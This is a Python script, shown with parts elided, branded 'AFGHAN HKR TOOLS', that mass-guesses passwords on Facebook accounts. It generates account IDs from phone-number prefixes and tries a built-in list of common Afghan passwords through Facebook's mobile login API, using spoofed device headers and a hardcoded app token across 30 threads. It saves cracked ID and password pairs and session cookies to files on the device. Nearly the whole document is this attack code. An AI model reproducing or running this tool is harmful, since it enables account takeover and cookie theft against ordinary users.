...
#= Hahaha, we are so important that you decoded my script
...
from bs4 import BeautifulSoup as sop	
print('[•] Join My Facebook id')
os.system('xdg-open https://chat.whatsapp.com/BfNPMT7kvgl7x3PWI7RiYu/')
...
=======================================================
\033[1;31m====================================================
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{AFGHAN HKR $ Afghan Hkr }\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{Afghan hkr & Afghan HKR }\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{AFGHAN HACK 907}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{AFGHAN HACK 907}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{+93764034195 & +93764034195 }\33[0;m
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mNETWORK \33[1;31m   ┇\033[1;37m{3G, 4G/5G, LTE }\33[0;m
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mCOMMAND \33[1;31m   ┇\033[37;41m{PAID}\33[0;m
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mVERSION   \033[1;31m ┇\033[31;47m{6.7}\33[0;m                 
\033[1;31m====================================================
\33[37;41m\t WELLCOME TO AFGAN HKR TOOLS\33[0;m
...
def randBuildLSB():
    ...
    END = ' [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/11.0.0;nullFBCA/armeabi-v7a:armeabi;] '
...
def AFG():
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','۱۲۳۴۵۶۷۸۹','500500','700800','500600','900900','10002000','50006000','۵۰۰۶۰۰','kabul123','Afghan1234','kabul1234','afghanistan','Afghan123','janjan','afghan','Afghanistan','50005000','jan123']
		...
		linex()
		input(' Afghan enter to back ')
		os.system('python FKING.py')

Ahkr1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
Ahkr = random.choice(Ahkr1)
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [AFGHAN➥HACKER]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        fblc = device['fblc']
                        fbcr = sim_id
                        Fjj=random.choice(Ahkr)
                        Fjjj=random.choice(Ahkr)
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        ...
                        ua = {'X-FB-Friendly-Name': 'authenticate', 'X-FB-Net-HNI': '94738', 'X-FB-SIM-HNI': '16039', 'X-FB-Connection-Type': 'Mobile.LTE', 'User-Agent': 'Etisalat', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
                        ...
                        'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=c1e620fa708a1d5696fb991c1bde5662',
                        'source': 'auth.login', 
                        'locale': 'en_US', 
                        'client_country_code': 'US', 
                        'advertising_id': 'f67353b3-84cd-45e7-a0e9-fdddbc79bd9b', 
                        'meta_inf_fbmeta': 'NO_FILE', 
                        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        headers={'Authorization':f'OAuth {accessToken}',
                        'X-FB-Connection-Quality': 'EXCELLENT', 
                        'x-fb-sim-hni': str(random.randint(1e3,2e7)),
                        'x-fb-net-hni': str(random.randint(2e4,4e4)),
                        'x-fb-connection-bandwidth': '30102906', 
                        'x-fb-connection-type':'MOBILE.LTE',
                        'x-fb-friendly_name': 'authenticate', 
                        'X-FB-connection-token': 'c1e620fa708a1d5696fb991c1bde5662',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [HKR==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/A-HKR-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/A-HKR-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [HKR==>CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/A-HKR-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
